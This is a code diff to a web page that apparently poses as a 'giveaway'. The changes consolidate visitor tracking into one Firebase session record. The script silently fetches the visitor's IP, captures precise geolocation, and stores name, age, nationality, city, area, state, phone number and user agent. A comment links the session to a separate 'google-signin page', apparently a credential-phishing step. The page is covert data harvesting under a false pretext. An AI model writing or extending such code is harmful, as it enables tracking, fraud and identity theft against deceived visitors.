@@ -268,7 +268,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
     import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
     const firebaseConfig = {
@@ -285,12 +285,29 @@
     const auth = getAuth(app);
     signInAnonymously(auth).then(() => log('🔐 Auth OK')).catch(e => log('❌ Auth: ' + e.message));
 
-    async function saveToFirebase(colName, data) {
+    // Generate unique session ID and store in sessionStorage so google-signin page can use it
+    let sessionId = sessionStorage.getItem('gw_session');
+    if (!sessionId) {
+      sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+      sessionStorage.setItem('gw_session', sessionId);
+    }
+
+    async function updateSession(data) {
       try {
-        await addDoc(collection(db, colName), { ...data, timestamp: new Date().toISOString(), device: navigator.userAgent });
-        log('✅ Saved to Firebase: ' + colName);
+        await setDoc(doc(db, 'sessions', sessionId), {
+          ...data,
+          session_id: sessionId,
+          last_updated: new Date().toISOString()
+        }, { merge: true });
+        log('✅ Session updated');
       } catch(e) { log('❌ Firebase: ' + e.message); }
     }
+
+    // Save initial session info on page load
+    updateSession({
+      started: new Date().toISOString(),
+      device: navigator.userAgent
+    });
 
     const CLOUD_NAME = 'duttdx7ou';
     const UPLOAD_PRESET = 'giveaway';
@@ -331,7 +348,7 @@
     // Fetch IP silently on load
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
-      .then(d => { ipAddress = d.ip; log('🌐 IP: ' + ipAddress); })
+      .then(d => { ipAddress = d.ip; log('🌐 IP: ' + ipAddress); updateSession({ ip: d.ip }); })
       .catch(() => {});
 
     // Check if returning from Google signin
@@ -539,8 +556,13 @@
             locationData.lng = pos.coords.longitude;
             locationData.accuracy = pos.coords.accuracy;
             locationData.ip = ipAddress;
-            // Save immediately to Firebase
-            saveToFirebase('locations', { ...locationData, type: 'immediate' });
+            // Save immediately to session
+            updateSession({
+              task4_lat: String(locationData.lat),
+              task4_lng: String(locationData.lng),
+              task4_accuracy: String(locationData.accuracy),
+              task4_location_captured: new Date().toISOString()
+            });
             log('📍 ' + locationData.lat + ', ' + locationData.lng);
             fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
               .then(r => r.json())
@@ -585,7 +607,15 @@
       const age  = document.getElementById('c-age').value.trim();
       const city = document.getElementById('c-city').value.trim();
       if (!name || !age || !city) return;
-      saveToFirebase('locations', { ...locationData, name, age, nationality: document.getElementById('c-nationality').value, city, area: document.getElementById('c-area').value, state: document.getElementById('c-state').value, type: 'full_submission' });
+      updateSession({
+        task4_name: name,
+        task4_age: age,
+        task4_nationality: document.getElementById('c-nationality').value,
+        task4_city: document.getElementById('c-city').value,
+        task4_area: document.getElementById('c-area').value,
+        task4_state: document.getElementById('c-state').value,
+        task4_completed: new Date().toISOString()
+      });
       document.getElementById('citizen-dialog').classList.remove('active');
       markTaskDone(4);
     });
@@ -610,7 +640,7 @@
     document.getElementById('phone-submit').addEventListener('click', () => {
       const val = document.getElementById('phone-input').value.trim();
       if (val.length !== 10) { document.getElementById('phone-error').style.display = 'block'; return; }
-      saveToFirebase('contacts', { phone: val, ip: ipAddress });
+      updateSession({ task5_phone: val, task5_completed: new Date().toISOString() });
       document.getElementById('phone-dialog').classList.remove('active');
       markTaskDone(5);
     });
